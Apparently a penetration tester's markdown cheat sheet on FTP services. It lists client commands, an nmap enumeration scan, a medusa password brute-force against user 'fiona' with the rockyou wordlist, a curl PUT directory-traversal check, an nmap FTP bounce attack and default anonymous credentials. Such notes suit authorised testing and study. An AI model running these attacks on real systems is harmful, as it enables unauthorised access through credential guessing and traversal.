## CMDs
```
ftp <ip> 
ls
cd
get or mget //multi
put or mput
help

medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp 

```
### ENUM
```shell-session
sudo nmap -sC -sV -p 21 192.168.2.142 
```

## HTTP PUT
FTP service does not correctly process HTTP PUT request
allowing for dir traversal 
```check if vuln
curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```

## FTP Bounce Attack 
```shell-session
nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
```
nmap -b to perform an FTP bounce attack 


## Dangerous Settings 
anonymous logins
creds: anonymous:anonymous 
## Tools
[medusa][https://github.com/jmk-foofus/medusa]  login brute-forcer 

ftp
iftp
ncftp
filezilla
crossftp
#FTP
